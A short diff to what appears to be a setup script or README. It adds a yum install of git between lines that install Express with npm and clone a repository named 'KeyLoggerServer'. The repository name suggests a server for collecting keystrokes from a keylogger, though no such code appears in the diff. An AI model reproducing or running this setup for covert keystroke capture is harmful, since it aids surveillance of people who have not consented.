@@ -17,6 +17,8 @@ sudo npm install -g express
 
 npm install express
 
+sudo yum install git -y
+
 # Clone the repository
 git clone https://github.com/SatyamPundir/KeyLoggerServer.git
 
